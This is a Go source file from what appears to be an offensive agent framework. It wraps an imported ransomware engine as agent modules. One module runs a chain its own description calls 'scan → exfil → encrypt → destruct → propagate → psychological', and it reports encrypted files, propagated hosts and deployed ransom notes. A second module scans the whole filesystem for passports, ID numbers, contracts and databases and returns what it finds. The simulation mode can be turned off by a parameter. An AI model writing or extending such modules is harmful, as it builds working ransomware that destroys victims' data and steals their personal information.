package agent

import (
	"context"
	"fmt"

	"github.com/ruby570bocadito/x404x/internal/ransomware"
)

type RansomwareModule struct {
	engine *ransomware.Engine
}

func NewRansomwareModule(cfg *ransomware.RansomwareConfig) (*RansomwareModule, error) {
	engine, err := ransomware.NewEngine(cfg)
	if err != nil {
		return nil, fmt.Errorf("ransomware engine: %w", err)
	}
	return &RansomwareModule{engine: engine}, nil
}

func (rm *RansomwareModule) Name() string {
	return "ransomware"
}

func (rm *RansomwareModule) Description() string {
	return "Full ransomware chain: scan → exfil → encrypt → destruct → propagate → psychological"
}

func (rm *RansomwareModule) Execute(ctx context.Context, agentID string, params map[string]interface{}) (map[string]interface{}, error) {
	campaignID := getParamString(params, "campaign_id", agentID)
	company := getParamString(params, "company", "Target")
	simulation := getParamBool(params, "simulation", rm.engine.Config.Simulation)

	rm.engine.Config.Simulation = simulation

	report, err := rm.engine.Execute(ctx, campaignID, company)
	if err != nil {
		return map[string]interface{}{
			"success": false,
			"error":   err.Error(),
		}, err
	}

	result := map[string]interface{}{
		"success":            report.Success,
		"campaign_id":        report.CampaignID,
		"files_scanned":      report.FilesScanned,
		"sensitive_found":    report.SensitiveFound,
		"files_encrypted":    report.FilesEncrypted,
		"exfil_packages":     report.ExfilPackages,
		"hosts_propagated":   report.HostsPropagated,
		"destruction_applied": report.DestructionApplied,
		"ransom_note_deployed": report.RansomNoteDeployed,
		"psychological_deployed": report.PsychologicalDeployed,
		"total_elapsed_ms":   report.TotalElapsedMs,
		"simulation":         simulation,
	}

	return result, nil
}

type RansomwareScanModule struct {
	engine *ransomware.Engine
}

func NewRansomwareScanModule(cfg *ransomware.RansomwareConfig) *RansomwareScanModule {
	engine, _ := ransomware.NewEngine(cfg)
	return &RansomwareScanModule{engine: engine}
}

func (rm *RansomwareScanModule) Name() string {
	return "ransomware_scan"
}

func (rm *RansomwareScanModule) Description() string {
	return "Scan filesystem for sensitive data (DNI, passports, contracts, databases)"
}

func (rm *RansomwareScanModule) Execute(ctx context.Context, agentID string, params map[string]interface{}) (map[string]interface{}, error) {
	scanRoot := "/"
	if _, ok := params["root"]; ok {
		scanRoot = getParamString(params, "root", scanRoot)
	}

	results := make(chan ransomware.ScanResult, 100)
	sensitive := make(chan ransomware.SensitiveData, 100)
	done := make(chan struct{})

	var allResults []ransomware.ScanResult
	var allSensitive []ransomware.SensitiveData

	go func() {
		for r := range results {
			allResults = append(allResults, r)
		}
	}()

	go func() {
		for s := range sensitive {
			allSensitive = append(allSensitive, s)
		}
		close(done)
	}()

	rm.engine.Scanner.ScanDirectory(scanRoot, nil, results, sensitive)
	<-done

	return map[string]interface{}{
		"success":         true,
		"files_scanned":   len(allResults),
		"sensitive_found": len(allSensitive),
		"sensitive_data":  allSensitive,
		"total_scanned":   len(allResults),
	}, nil
}

func getParamString(params map[string]interface{}, key, def string) string {
	if v, ok := params[key]; ok {
		if s, ok := v.(string); ok {
			return s
		}
	}
	return def
}

func getParamBool(params map[string]interface{}, key string, def bool) bool {
	if v, ok := params[key]; ok {
		if b, ok := v.(bool); ok {
			return b
		}
	}
	return def
}

